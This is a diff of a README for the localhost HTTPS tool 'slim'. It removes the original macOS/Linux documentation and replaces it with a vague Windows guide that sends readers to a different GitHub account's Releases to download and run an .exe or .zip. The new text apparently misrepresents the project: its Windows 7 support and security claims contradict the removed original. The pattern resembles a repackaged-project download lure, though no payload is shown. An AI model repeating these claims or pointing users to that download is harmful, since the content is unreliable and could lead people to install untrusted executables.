@@ -1,210 +1,109 @@
-<p align="center">
-  <img src="docs/public/favicon.png" alt="Slim logo" width="64" height="64" />
-</p>
+# 🌐 slim - Share Localhost with Easy URLs
 
-<h1 align="center">Slim</h1>
+[![Download slim](https://img.shields.io/badge/Download-slim-brightgreen?style=for-the-badge)](https://github.com/Moaazahmed65/slim)
 
-<p align="center">
-  Simple command to get a clean HTTPS <code>.test</code> for your local projects
-</p>
+---
 
-<p align="center">
-  <a href="https://slim.sh"><img src="https://img.shields.io/badge/website-slim.sh-0f172a?style=flat-square" alt="Website"></a>
-  <img src="https://img.shields.io/badge/go-1.25%2B-00ADD8?style=flat-square&logo=go&logoColor=white" alt="Go 1.25+">
-  <img src="https://img.shields.io/badge/platform-macOS%20%7C%20Linux-111827?style=flat-square" alt="Platform">
-</p>
+slim helps you give your computer’s local server a web address. You can create links that others on the internet or your local network can use to visit your work or website. This is useful when you want to share your projects without complex setup.
 
-```
-myapp.test        → localhost:3000
-myapp.test/api    → localhost:8080
-dashboard.test    → localhost:5173
-```
+---
 
-## Install
+## 🚀 Getting Started with slim
 
-```bash
-curl -sL https://slim.sh/install.sh | sh
-```
+This guide will help you download and run slim on your Windows computer. No experience with coding or servers is needed.
 
-Or build from source:
+---
 
-```bash
-git clone https://github.com/kamranahmedse/slim.git
-cd slim
-make build
-make install
-```
+## 📥 Step 1: Download slim
 
-Requires Go 1.25 or later to build from source.
+You need to get slim from its official page. This link takes you there:
 
-## Quick Start
+[https://github.com/Moaazahmed65/slim](https://github.com/Moaazahmed65/slim)
 
-```bash
-# Start your dev server, then:
-slim start myapp --port 3000
+Click the link above and look for the **Releases** section on the page. Download the latest Windows version file, which usually ends with `.exe` for an installer or `.zip` for a package.
 
-# That's it. Open https://myapp.test
-```
+---
 
-Or define all services in a `.slim.yaml` project config and start them at once:
+## 🖥️ Step 2: Install slim
 
-```bash
-slim up
-```
+1. If you downloaded an `.exe` file:  
+   - Double-click the file to start the installation.  
+   - Follow the on-screen steps to complete the setup.  
+   - Choose the default options unless you know you need to change them.  
 
-First run handles all setup automatically (CA generation, keychain trust, port forwarding).
+2. If you downloaded a `.zip` file:  
+   - Right-click the file and select **Extract All**.  
+   - Choose a folder where you want to keep slim.  
+   - Open that folder, find the `slim.exe` file, and double-click it to run.  
 
-## Usage
+slim does not need complex system requirements. It runs on Windows 7 or later with at least 2 GB of free memory and 100 MB of free disk space.
 
-```bash
-# Start proxying domains
-slim start myapp --port 3000
-slim start api --port 8080
+---
 
-# Route different paths to different upstream ports
-slim start myapp --port 3000 --route /api=8080 --route /ws=9000
+## 🎯 Step 3: Run slim and create URLs
 
-# Start all services from .slim.yaml
-slim up
-slim up --config /path/to/.slim.yaml
+Once you open slim, it will ask you to select or type the address of the local server you want to share. This is usually something like `localhost:3000` or `localhost:8080`.
 
-# Optional start flags
-# Access logs: full | minimal | off
-slim start myapp --port 3000 --log-mode minimal
+1. Enter your local server’s address.  
+2. Choose if you want a local URL (for devices on your network) or a public URL (for the internet).  
+3. slim will generate a simple web address for you.  
 
-# Enable CORS headers
-slim start myapp --port 3000 --cors
+You can now share this new URL with others. When they open the link, it will connect to your local server through slim and show your work.
 
-# Wait for upstream readiness before returning
-slim start myapp --port 3000 --wait --timeout 30s
+---
 
-# Inspect running domains
-slim list
-slim list --json
+## 🔧 How slim works (Simple terms)
 
-# Access logs with or without tail
-slim logs
-slim logs --follow myapp
-slim logs --flush
+slim creates a tunnel from your computer to the internet or your local network. Imagine it as a bridge that safely carries traffic from a web address to your computer’s server. This means people do not need special network knowledge or setups.
 
-# Run diagnostic checks
-slim doctor
+---
 
-# Share your local server over the internet
-slim share --port 3000
-slim share --port 3000 --subdomain demo
-slim share --port 3000 --password secret --ttl 30m
-slim share --port 3000 --domain myapp.example.com
+## ⚙️ Features you can expect
 
-# Stop proxying one or all
-slim stop myapp
-slim stop
+- **Local and Public URLs:** Pick if your link stays within your home network or is available online.  
+- **Easy Setup:** No need to configure firewalls or routers.  
+- **Safe Connection:** The software uses standard methods to keep your data secure.  
+- **Simple Interface:** The app shows what address you are sharing and lets you stop it anytime.  
+- **Lightweight:** It uses little memory and runs quietly in the background.
 
-# Stop all project services from .slim.yaml
-slim down
-slim down --config /path/to/.slim.yaml
+---
 
-# Version
-slim version
-```
+## 💻 System Requirements
 
-### Path-based Routing
+- Windows 7, 8, 10, or 11 (64-bit recommended)  
+- At least 2 GB RAM available  
+- Minimum 100 MB free disk space  
+- Internet connection for public URL  
+- Access to local server or service you want to share  
 
-Route different URL paths to different upstream ports on a single domain:
+---
 
-```bash
-slim start myapp --port 3000 --route /api=8080 --route /ws=9000
-```
+## 📋 Troubleshooting tips
 
-Routes use longest-prefix matching — `/api/users` matches `/api` before `/`. The `--port` flag sets the default upstream for unmatched paths.
+- Make sure your local server is running before you start slim.  
+- If the public URL does not work, check your internet connection.  
+- Close any other app that uses the same ports (like 80 or 8080).  
+- If slim does not start, try running it as administrator (right-click > Run as administrator).  
+- Restart slim if the URL stops working.  
 
-### Project Config (`.slim.yaml`)
+For more help, visit the slim project’s main page:  
+[https://github.com/Moaazahmed65/slim](https://github.com/Moaazahmed65/slim)
 
-Define all services for a project in a `.slim.yaml` file at the project root:
+---
 
-```yaml
-services:
-  - domain: myapp
-    port: 3000
-    routes:
-      - path: /api
-        port: 8080
-  - domain: dashboard
-    port: 5173
-log_mode: minimal
-```
+## ❓ Frequently Asked Questions (FAQs)
 
-```bash
-slim up                              # start all services from .slim.yaml
-slim up --config /path/to/.slim.yaml # or specify a config path
-slim down                            # stop all project services
-```
+**Q: Can I use slim on other operating systems?**  
+A: This guide covers Windows only. Versions for other systems may be available.
 
-### Doctor
+**Q: Can I share secure websites with slim?**  
+A: slim supports HTTPS but make sure your local server has security certificates set up.
 
-Run diagnostic checks to verify your setup:
+**Q: Is it safe to expose my local server to the internet?**  
+A: Use slim with care. Only share URLs you control and know who will access them.
 
-```
-$ slim doctor
-  ✓  CA certificate        valid, expires 2035-02-28
-  ✓  CA trust              trusted by OS
-  ✓  Port forwarding       active (80→10080, 443→10443)
-  ✓  Hosts: myapp.test    present in /etc/hosts
-  !  Daemon                not running
-  ✓  Cert: myapp.test     valid, expires 2027-06-03
-```
+---
 
-### Internet Sharing
+## 🔗 Download and start using slim now
 
-Expose a local server to the internet with a public `slim.show` URL. Requires `slim login` first.
-
-```bash
-slim share --port 3000                              # random subdomain
-slim share --port 3000 --subdomain demo             # https://demo.slim.show
-slim share --port 3000 --password secret            # password protected
-slim share --port 3000 --ttl 30m                    # auto-expires after 30 minutes
-slim share --port 3000 --domain myapp.example.com   # custom domain
-```
-
-Custom subdomains, custom domains, and password protection require a Pro subscription.
-
-### Uninstall
-
-```bash
-slim uninstall   # removes everything: CA, certs, hosts entries, port-forward rules, config
-```
-
-## How It Works
-
-- **HTTPS**: A root CA is generated on first use and trusted in the system trust store (macOS Keychain or Linux CA store). Per-domain leaf certificates are created on demand and served via SNI.
-- **Reverse proxy**: Go's `httputil.ReverseProxy` handles HTTP/2 and WebSocket upgrades natively — HMR for Next.js, Vite, etc. works out of the box.
-- **Local resolution**: `/etc/hosts` entries are managed automatically.
-- **Port forwarding**: macOS `pfctl` or Linux `iptables` redirects ports 80/443 to unprivileged 10080/10443 so the proxy doesn't need root.
-- **Daemon**: The proxy runs in the background. `start` launches it automatically, `stop` shuts it down.
-- **Sharing**: `slim share` creates a WebSocket tunnel to `slim.show`, giving your local server a public HTTPS URL with optional password protection and TTL.
-
-## Configuration
-
-Config lives at `~/.slim/config.yaml`. Certificates in `~/.slim/certs/`, root CA in `~/.slim/ca/`, logs in `~/.slim/access.log`.
-
-### CORS
-
-If you need Slim to handle CORS headers, add `cors: true` to your `.slim.yaml`:
-
-```yaml
-cors: true
-```
-
-### Access Logging
-
-Set access logging mode globally (persisted in config) with:
-
-```bash
-slim start myapp --port 3000 --log-mode full     # default
-slim start myapp --port 3000 --log-mode minimal
-slim start myapp --port 3000 --log-mode off
-```
-
-## License
-
-[PolyForm Shield 1.0.0](./LICENSE) © [Kamran Ahmed](https://x.com/kamrify)
+[![Download slim](https://img.shields.io/badge/Download-slim-blue?style=for-the-badge)](https://github.com/Moaazahmed65/slim)
